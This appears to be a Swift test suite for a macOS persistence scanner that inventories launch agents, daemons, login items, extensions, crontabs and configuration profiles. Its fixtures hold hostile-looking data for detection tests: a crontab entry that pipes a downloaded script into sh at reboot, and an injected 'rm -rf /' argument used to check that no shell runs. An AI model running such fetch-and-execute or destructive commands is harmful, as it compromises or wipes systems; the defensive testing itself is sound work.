import Foundation
import Testing
@testable import NetbiteCore

/// A throwaway folder with a fake home and a fake system root.
private struct Fixture {
    let base: URL
    var home: URL { base.appending(path: "home") }
    var root: URL { base.appending(path: "root") }

    init() throws {
        base = FileManager.default.temporaryDirectory.appending(path: "netbite-persistence-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: base, withIntermediateDirectories: true)
    }

    func remove() { try? FileManager.default.removeItem(at: base) }

    @discardableResult
    func write(_ data: Data, to path: String, under folder: URL) throws -> URL {
        let url = folder.appending(path: path)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try data.write(to: url)
        return url
    }

    func plist(_ object: [String: Any], to path: String, under folder: URL, binary: Bool = false) throws {
        let data = try PropertyListSerialization.data(fromPropertyList: object, format: binary ? .binary : .xml, options: 0)
        try write(data, to: path, under: folder)
    }

    func scanner(tools: ToolRunner = .none) -> PersistenceScanner {
        PersistenceScanner(roots: .init(home: home, system: root, userID: 501, userName: "alex"), tools: tools)
    }
}

/// Answers like the real tools from canned text and remembers what was asked.
private final class FakeTools: @unchecked Sendable {
    private let lock = NSLock()
    private var calls: [String] = []
    let answers: [String: String]

    init(_ answers: [String: String]) { self.answers = answers }

    var runner: ToolRunner {
        ToolRunner { executable, arguments in
            let command = ([executable] + arguments).joined(separator: " ")
            self.lock.withLock { self.calls.append(command) }
            return self.answers[command].map { ToolOutput(output: $0) }
        }
    }

    var invoked: [String] { lock.withLock { calls } }
}

@Suite struct LaunchdScanTests {
    static let printDisabled = """
    disabled services = {
    \t\t"com.example.overridden" => disabled
    \t\t"com.example.agent" => enabled
    \t}
    """

    private func makeFixture() throws -> Fixture {
        let fixture = try Fixture()
        let agents = fixture.home.appending(path: "Library/LaunchAgents")
        try fixture.plist(["Label": "com.example.agent", "Program": "/usr/bin/true", "RunAtLoad": true],
                          to: "com.example.agent.plist", under: agents)
        try fixture.plist(["Label": "com.example.disabled", "ProgramArguments": ["/usr/bin/true"], "Disabled": true],
                          to: "com.example.disabled.plist", under: agents)
        try fixture.plist(["Label": "com.example.overridden", "ProgramArguments": ["/usr/bin/true", "--flag"]],
                          to: "com.example.overridden.plist", under: agents)
        try fixture.write(Data("<plist><dict><key>Label</key>".utf8), to: "com.example.malformed.plist", under: agents)
        try fixture.write(Data("not a plist".utf8), to: "README.txt", under: agents)

        let daemons = fixture.root.appending(path: "Library/LaunchDaemons")
        try fixture.plist(["Label": "com.example.daemon", "ProgramArguments": ["/bin/sh", "-c", "echo hi"],
                           "KeepAlive": ["SuccessfulExit": false]],
                          to: "com.example.daemon.plist", under: daemons, binary: true)
        try fixture.plist(["Label": "com.example.bundled", "BundleProgram": "Contents/MacOS/helper",
                           "AssociatedBundleIdentifiers": ["com.example.app"], "RunAtLoad": true],
                          to: "com.example.bundled.plist", under: daemons)
        try fixture.plist(["Label": "com.example.ghost", "Program": "/opt/example/missing"],
                          to: "com.example.renamed.plist", under: daemons)

        let app = fixture.root.appending(path: "Applications/Example.app/Contents")
        try fixture.plist(["CFBundleIdentifier": "com.example.app"], to: "Info.plist", under: app)
        try fixture.write(Data(), to: "MacOS/helper", under: app)

        try fixture.plist(["Label": "com.apple.example", "Program": "/usr/libexec/example"],
                          to: "com.apple.example.plist", under: fixture.root.appending(path: "System/Library/LaunchAgents"))
        return fixture
    }

    private func scan(_ fixture: Fixture, includeApple: Bool = false) -> PersistenceReport {
        let tools = FakeTools(["/bin/launchctl print-disabled gui/501": Self.printDisabled,
                               "/bin/launchctl print-disabled system": "disabled services = {\n}\n"])
        return fixture.scanner(tools: tools.runner)
            .scan(options: .init(includeApple: includeApple, categories: [.launchAgent, .launchDaemon]))
    }

    private func item(_ report: PersistenceReport, _ label: String) throws -> PersistenceItem {
        try #require(report.items.first { $0.label == label })
    }

    @Test func readsXMLAndBinaryPlists() throws {
        let fixture = try makeFixture()
        defer { fixture.remove() }
        let report = scan(fixture)

        let agent = try item(report, "com.example.agent")
        #expect(agent.category == .launchAgent)
        #expect(agent.scope == .user)
        #expect(agent.executablePath == "/usr/bin/true")
        #expect(agent.runAtLoad == true)
        #expect(agent.isDisabled == false)
        #expect(agent.modifiedAt != nil)
        #expect(agent.notes.isEmpty)

        let daemon = try item(report, "com.example.daemon")
        #expect(daemon.category == .launchDaemon)
        #expect(daemon.scope == .system)
        #expect(daemon.executablePath == "/bin/sh")
        #expect(daemon.arguments == ["/bin/sh", "-c", "echo hi"])
        #expect(daemon.keepAlive == true)
        #expect(daemon.details["keepAlive"] == "conditional")
        #expect(daemon.notes.contains("runs an inline script"))
    }

    @Test func combinesPlistAndLaunchctlDisabledState() throws {
        let fixture = try makeFixture()
        defer { fixture.remove() }
        let report = scan(fixture)
        #expect(try item(report, "com.example.disabled").isDisabled == true)
        #expect(try item(report, "com.example.overridden").isDisabled == true)
    }

    @Test func reportsMalformedPlistsAsItems() throws {
        let fixture = try makeFixture()
        defer { fixture.remove() }
        let malformed = try item(scan(fixture), "com.example.malformed")
        #expect(malformed.notes.contains("malformed property list"))
        #expect(malformed.executablePath == nil)
    }

    @Test func resolvesBundleProgramThroughTheOwningApp() throws {
        let fixture = try makeFixture()
        defer { fixture.remove() }
        let bundled = try item(scan(fixture), "com.example.bundled")
        let appPath = fixture.root.appending(path: "Applications/Example.app").path
        #expect(bundled.owningBundleIdentifier == "com.example.app")
        #expect(bundled.owningBundlePath == appPath)
        #expect(bundled.executablePath == appPath + "/Contents/MacOS/helper")
        #expect(!bundled.notes.contains("program does not exist"))
    }

    @Test func flagsOddities() throws {
        let fixture = try makeFixture()
        defer { fixture.remove() }
        let ghost = try item(scan(fixture), "com.example.ghost")
        #expect(ghost.notes.contains("label differs from the file name"))
        #expect(ghost.notes.contains("program does not exist"))
    }

    @Test func appleJobsAreOptIn() throws {
        let fixture = try makeFixture()
        defer { fixture.remove() }
        #expect(!scan(fixture).items.contains { $0.scope == .apple })
        let apple = try item(scan(fixture, includeApple: true), "com.apple.example")
        #expect(apple.scope == .apple)
    }

    @Test func sortsByCategoryScopeAndLabel() throws {
        let fixture = try makeFixture()
        defer { fixture.remove() }
        let report = scan(fixture, includeApple: true)
        #expect(report.items.count == 8)
        #expect(report.items.map(\.label) == [
            "com.example.agent", "com.example.disabled", "com.example.malformed", "com.example.overridden",
            "com.apple.example",
            "com.example.bundled", "com.example.daemon", "com.example.ghost",
        ])
        #expect(Set(report.items.map(\.id)).count == report.items.count)
    }

    @Test func reportRoundTripsThroughJSON() throws {
        let fixture = try makeFixture()
        defer { fixture.remove() }
        let report = scan(fixture)
        let decoded = try JSONDecoder.netbite.decode(PersistenceReport.self, from: JSONEncoder.netbite.encode(report))
        #expect(decoded.items == report.items)
    }
}

@Suite struct BackgroundTaskTests {
    // Shape of `sfltool dumpbtm` on macOS 15 and later; names and identifiers are made up.
    static let dumpbtm = """
    ========================
     Records for UID 501 : 4F2B7A10-0C3E-4D2A-9B1F-6E8D5C4A3B21
    ========================

     ServiceManagement migrated: true
     SharedFileList migrated: true

     Items:

     #1:
                     UUID: 0B9E6C2A-7D41-4F8E-A3C5-1F2E3D4C5B6A
                     Name: Example Menu
           Developer Name: Example Software Ltd
          Team Identifier: EXAMPLE123
                     Type: app (0x2)
                    Flags: [  ] (0)
              Disposition: [enabled, allowed, visible, notified] (0xb)
               Identifier: 2.com.example.menu
                      URL: file:///Applications/Example%20Menu.app/
               Generation: 1
        Bundle Identifier: com.example.menu

     #2:
                     UUID: 6C1D2E3F-4A5B-4C6D-8E7F-9A0B1C2D3E4F
                     Name: Example Software Ltd
           Developer Name: Example Software Ltd
                     Type: developer (0x20)
                    Flags: [  ] (0)
              Disposition: [enabled, allowed, visible, notified] (0xb)
               Identifier: Example Software Ltd
                      URL: (null)
               Generation: 0
        Embedded Item Identifiers:
            #1:                2.com.example.menu
            #2:                8.com.example.sync.agent

     #3:
                     UUID: 7D2E3F4A-5B6C-4D7E-9F8A-0B1C2D3E4F5A
                     Name: sync-agent
           Developer Name: Example Software Ltd
          Team Identifier: EXAMPLE123
                     Type: agent (0x8)
                    Flags: [  ] (0)
              Disposition: [disabled, allowed, visible, notified] (0xa)
               Identifier: 8.com.example.sync.agent
                      URL: file:///Applications/Example%20Menu.app/Contents/Library/LaunchAgents/com.example.sync.agent.plist
          Executable Path: /Applications/Example Menu.app/Contents/MacOS/sync-agent
               Generation: 3
        Assoc. Bundle IDs: [com.example.menu]
        Parent Identifier: Example Software Ltd

     #4:
                     UUID: 8E3F4A5B-6C7D-4E8F-AA9B-1C2D3E4F5A6B
                     Name: com.example.legacy
                     Type: legacy agent (0x10008)
                    Flags: [  ] (0)
              Disposition: [enabled, allowed, visible, notified] (0xb)
               Identifier: com.example.legacy
                      URL: file:///Library/LaunchAgents/com.example.legacy.plist
          Executable Path: /usr/local/bin/example-legacy
               Generation: 1

    ========================
     Records for UID 0 : 00000000-0000-0000-0000-000000000000
    ========================

     Items:

     #1:
                     UUID: 9F4A5B6C-7D8E-4F9A-BBAC-2D3E4F5A6B7C
                     Name: example-daemon
          Team Identifier: EXAMPLE123
                     Type: daemon (0x10)
                    Flags: [  ] (0)
              Disposition: [enabled, disallowed, visible, notified] (0x9)
               Identifier: 16.com.example.daemon
                      URL: file:///Applications/Example%20Menu.app/Contents/Library/LaunchDaemons/com.example.daemon.plist
          Executable Path: /Applications/Example Menu.app/Contents/MacOS/example-daemon
               Generation: 2
        Assoc. Bundle IDs: [com.example.menu]
    """

    @Test func parsesDumpbtm() throws {
        let items = PersistenceParsers.backgroundTaskItems(Self.dumpbtm)
        #expect(items.map(\.label) == ["Example Menu", "sync-agent", "example-daemon"])

        let app = items[0]
        #expect(app.category == .loginItem)
        #expect(app.scope == .user)
        #expect(app.executablePath == "/Applications/Example Menu.app")
        #expect(app.owningBundleIdentifier == "com.example.menu")
        #expect(app.teamIdentifier == "EXAMPLE123")
        #expect(app.isDisabled == false)

        let agent = items[1]
        #expect(agent.category == .backgroundTask)
        #expect(agent.isDisabled == true)
        #expect(agent.executablePath == "/Applications/Example Menu.app/Contents/MacOS/sync-agent")
        #expect(agent.details["identifier"] == "com.example.sync.agent")

        let daemon = items[2]
        #expect(daemon.scope == .system)
        #expect(daemon.details["uid"] == "0")
        #expect(daemon.notes.contains("blocked in Login Items settings"))
    }

    @Test func neverRunsSfltoolWithoutRoot() throws {
        guard geteuid() != 0 else { return }
        let fixture = try Fixture()
        defer { fixture.remove() }
        let tools = FakeTools([:])
        let report = fixture.scanner(tools: tools.runner).scan(options: .init(categories: [.loginItem, .backgroundTask]))
        #expect(report.items.isEmpty)
        #expect(report.sources.flatMap(\.notes).contains { $0.hasPrefix("needs the helper") })
        #expect(!tools.invoked.contains { $0.contains("sfltool") })
    }

    @Test func usesSfltoolOutputFromTheHelper() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        let tools = FakeTools([:])
        let options = PersistenceScanner.Options(categories: [.loginItem, .backgroundTask],
                                                 backgroundTaskOutput: ToolOutput(output: Self.dumpbtm, truncated: true))
        let report = fixture.scanner(tools: tools.runner).scan(options: options)
        #expect(report.items.map(\.label).sorted() == ["Example Menu", "example-daemon", "sync-agent"])
        #expect(report.sources.flatMap(\.notes) == ["sfltool output was truncated"])
        #expect(!tools.invoked.contains { $0.contains("sfltool") })
    }
}

@Suite struct PersistenceParserTests {
    @Test func parsesLaunchctlOverrides() {
        let overrides = PersistenceParsers.disabledOverrides(LaunchdScanTests.printDisabled + "\n\"com.example.old\" => true\n")
        #expect(overrides == ["com.example.overridden": true, "com.example.agent": false, "com.example.old": true])
    }

    @Test func parsesSystemExtensions() {
        let sample = """
        2 extension(s)
        --- com.apple.system_extension.network_extension (Go to 'System Settings > General > Login Items & Extensions > Network Extensions' to modify these system extension(s))
        enabled\tactive\tteamID\tbundleID (version)\tname\t[state]
        *\t*\tEXAMPLE123\tcom.example.firewall.extension (2.1.0/2.1.0)\tExample Firewall\t[activated enabled]
        --- com.apple.system_extension.endpoint_security (Go to 'System Settings > General > Login Items & Extensions > Endpoint Security Extensions' to modify these system extension(s))
        enabled\tactive\tteamID\tbundleID (version)\tname\t[state]
        \t\tEXAMPLE456\tcom.example.edr.extension (1.4/104)\tExample EDR\t[activated waiting for user]
        """
        let items = PersistenceParsers.systemExtensions(sample)
        #expect(items.count == 2)
        #expect(items[0].label == "com.example.firewall.extension")
        #expect(items[0].version == "2.1.0")
        #expect(items[0].teamIdentifier == "EXAMPLE123")
        #expect(items[0].isDisabled == false)
        #expect(items[0].details["type"] == "network_extension")
        #expect(items[1].isDisabled == true)
        #expect(items[1].details["type"] == "endpoint_security")
        #expect(items[1].notes == ["waiting for the user to approve it"])
    }

    @Test func parsesLoadedKernelExtensionsSkippingApple() {
        let sample = """
        No variant specified, falling back to release
        Index Refs Address            Size       Wired      Name (Version) UUID <Linked Against>
            1  154 0                  0          0          com.apple.kpi.bsd (25.6.0) 3F7964F9-C5A6-39D4-942D-1A2B3C4D5E6F <>
           52    3 0                  0          0          com.apple.iokit.IOUSBHostFamily (1.2) 0A1B2C3D-4E5F-3A6B-8C7D-9E0F1A2B3C4D <6 5 4 3 1>
          212    0 0                  0          0          com.example.driver.UsbSerial (3.2.1) 9A8B7C6D-1E2F-3A4B-5C6D-7E8F9A0B1C2D <52 6 5 3 1>
        """
        let items = PersistenceParsers.loadedKernelExtensions(sample)
        #expect(items.map(\.label) == ["com.example.driver.UsbSerial"])
        #expect(items.first?.version == "3.2.1")
        #expect(items.first?.details["uuid"] == "9A8B7C6D-1E2F-3A4B-5C6D-7E8F9A0B1C2D")
    }

    @Test func parsesCrontab() {
        let sample = """
        # m h dom mon dow command
        MAILTO=""
        SHELL = /bin/zsh
        */15 * * * * /usr/local/bin/backup.sh --quiet

        @reboot curl -s https://example.invalid/setup | sh
        0 3 * * 1\t/Users/alex/bin/cleanup
        """
        let items = PersistenceParsers.crontab(sample, owner: "alex", path: nil, scope: .user)
        #expect(items.count == 3)
        #expect(items[0].details["schedule"] == "*/15 * * * *")
        #expect(items[0].executablePath == "/usr/local/bin/backup.sh")
        #expect(items[0].arguments == ["/usr/local/bin/backup.sh", "--quiet"])
        #expect(items[1].details["schedule"] == "@reboot")
        #expect(items[1].executablePath == nil)
        #expect(items[1].notes == ["command is not an absolute path", "downloads from the network"])
        #expect(items[2].label == "/Users/alex/bin/cleanup")
    }

    @Test func parsesSafariExtensions() {
        let sample = """
             com.example.passwords.safari.extension(8.1.0)
        \t            Path = /Applications/Example Passwords for Safari.app/Contents/PlugIns/Example.appex
        \t            UUID = 4498EE43-DE27-4EE6-B4FD-0A1B2C3D4E5F
        \t       Timestamp = 2026-09-11 13:07:39 +0000
        \t             SDK = com.apple.Safari.web-extension
        \t   Parent Bundle = /Applications/Example Passwords for Safari.app
        \t    Display Name = Example Passwords
        \t      Short Name = Example
        \t     Parent Name = Example Passwords for Safari
        \t        Platform = macOS

        -    com.example.adblock.extension(2.0)
        \t            Path = /Applications/Example Blocker.app/Contents/PlugIns/Extension.appex
        \t   Parent Bundle = /Applications/Example Blocker.app
        \t    Display Name = Example Blocker

         (2 plug-ins)
        """
        let items = PersistenceParsers.safariExtensions(sample)
        #expect(items.map(\.label) == ["Example Passwords", "Example Blocker"])
        #expect(items[0].version == "8.1.0")
        #expect(items[0].isDisabled == nil)
        #expect(items[0].owningBundlePath == "/Applications/Example Passwords for Safari.app")
        #expect(items[0].details["bundleID"] == "com.example.passwords.safari.extension")
        #expect(items[1].isDisabled == true)
    }

    @Test func parsesConfigurationProfiles() throws {
        let sample = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>_computerlevel</key>
            <array>
                <dict>
                    <key>ProfileDisplayName</key><string>Example Proxy</string>
                    <key>ProfileIdentifier</key><string>com.example.proxy</string>
                    <key>ProfileOrganization</key><string>Example Corp</string>
                    <key>ProfileInstallDate</key><date>2026-01-15T10:00:00Z</date>
                    <key>ProfileItems</key>
                    <array>
                        <dict><key>PayloadType</key><string>com.apple.proxy.http.global</string></dict>
                        <dict><key>PayloadType</key><string>com.apple.security.root</string></dict>
                    </array>
                </dict>
            </array>
        </dict>
        </plist>
        """
        let items = try PersistenceParsers.configurationProfiles(Data(sample.utf8))
        #expect(items.count == 1)
        #expect(items[0].label == "Example Proxy")
        #expect(items[0].scope == .system)
        #expect(items[0].details["organization"] == "Example Corp")
        #expect(items[0].notes == ["installs com.apple.proxy.http.global", "installs com.apple.security.root"])
        #expect(try PersistenceParsers.configurationProfiles(Data("<plist version=\"1.0\"><dict/></plist>".utf8)).isEmpty)
    }
}

@Suite struct BrowserExtensionTests {
    @Test func readsChromeManifestWithLocalizedName() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        let id = "abcdefghijklmnopabcdefghijklmnop"
        let extensions = fixture.home.appending(path: "Library/Application Support/Google/Chrome/Profile 1/Extensions/\(id)")
        let manifest = """
        {"manifest_version": 3, "name": "__MSG_appName__", "version": "1.10.0", "default_locale": "en",
         "permissions": ["storage", "nativeMessaging"], "host_permissions": ["<all_urls>"]}
        """
        try fixture.write(Data(manifest.utf8), to: "1.10.0_0/manifest.json", under: extensions)
        try fixture.write(Data(#"{"APPNAME": {"message": "Example Helper"}}"#.utf8),
                          to: "1.10.0_0/_locales/en/messages.json", under: extensions)
        // An older version left behind until the browser restarts.
        try fixture.write(Data(#"{"name": "Old", "version": "1.9.0"}"#.utf8), to: "1.9.0_0/manifest.json", under: extensions)

        let report = fixture.scanner().scan(options: .init(categories: [.browserExtension]))
        let item = try #require(report.items.first)
        #expect(report.items.count == 1)
        #expect(item.label == "Example Helper")
        #expect(item.version == "1.10.0")
        #expect(item.details["browser"] == "Google Chrome")
        #expect(item.details["profile"] == "Profile 1")
        #expect(item.details["permissions"] == "3")
        #expect(item.notes.contains("can read and change data on all websites"))
        #expect(item.notes.contains("can talk to native apps"))
        #expect(item.notes.contains { $0.hasPrefix("no update URL") })
    }

    @Test func readsFirefoxExtensionsJSON() throws {
        let json = """
        {"schemaVersion": 36, "addons": [
          {"id": "helper@example.org", "type": "extension", "version": "4.2", "active": true,
           "location": "app-profile", "defaultLocale": {"name": "Example Helper"},
           "userPermissions": {"permissions": ["tabs", "storage"], "origins": ["<all_urls>"]}},
          {"id": "formautofill@mozilla.org", "type": "extension", "location": "app-builtin", "active": true},
          {"id": "theme@example.org", "type": "theme", "location": "app-profile", "active": false}
        ]}
        """
        let items = try PersistenceParsers.firefoxExtensions(Data(json.utf8), path: "/x/extensions.json", profile: "abcd.default")
        #expect(items.map(\.label) == ["Example Helper"])
        #expect(items[0].details["permissions"] == "3")
        #expect(items[0].isDisabled == false)
    }
}

@Suite struct PeriodicTests {
    @Test func separatesStockScriptsFromAdditions() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        let daily = fixture.root.appending(path: "etc/periodic/daily")
        try fixture.write(Data("#!/bin/sh\n".utf8), to: "110.clean-tmps", under: daily)
        try fixture.write(Data("#!/bin/sh\n".utf8), to: "500.example", under: daily)

        let items = fixture.scanner().scan(options: .init(includeApple: true, categories: [.periodicScript])).items
        #expect(items.map(\.label).sorted() == ["110.clean-tmps", "500.example"])
        let addition = try #require(items.first { $0.label == "500.example" })
        #expect(addition.scope == .system)
        #expect(addition.notes.contains("not part of macOS"))
        #expect(items.first { $0.label == "110.clean-tmps" }?.notes.contains("not part of macOS") == false)
    }
}

@Suite struct ToolRunnerTests {
    @Test func runsWithoutAShellAndCapturesOutput() throws {
        let result = try #require(ProcessTool.run("/bin/echo", ["$HOME", "; rm -rf /"]))
        #expect(result.output == "$HOME ; rm -rf /\n")
        #expect(result.succeeded)
    }

    @Test func killsSlowTools() throws {
        let result = try #require(ProcessTool.run("/bin/sleep", ["30"], timeout: 0.3))
        #expect(result.timedOut)
    }

    @Test func capsOutput() throws {
        let result = try #require(ProcessTool.run("/usr/bin/yes", [], timeout: 1, cap: 1024))
        #expect(result.output.utf8.count == 1024)
        #expect(result.truncated)
    }

    @Test func refusesRelativePaths() {
        #expect(ProcessTool.run("echo", ["hi"]) == nil)
    }
}
